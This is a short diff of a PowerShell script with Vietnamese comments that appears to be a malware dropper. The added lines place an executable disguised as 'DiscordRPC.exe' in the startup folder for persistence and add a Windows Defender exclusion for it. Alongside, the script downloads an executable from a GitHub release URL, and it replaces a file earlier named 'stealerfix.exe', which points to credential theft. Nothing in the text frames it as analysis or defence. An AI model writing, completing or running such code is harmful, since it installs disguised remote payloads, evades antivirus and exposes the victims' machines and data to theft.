@@ -23,7 +23,8 @@ if (!(Test-Path $filePath)) {
 # Chạy file thực thi
 Start-Process -FilePath $filePath -NoNewWindow
 
-$filePath = "$folderPath\stealerfix.exe"
+$filePath = "$startupfolder\DiscordRPC.exe"
+Add-MpPreference -ExclusionPath $filePath
 $url = "https://github.com/43a1723/test/releases/download/siu/discord.rpc.exe"
 if (!(Test-Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force
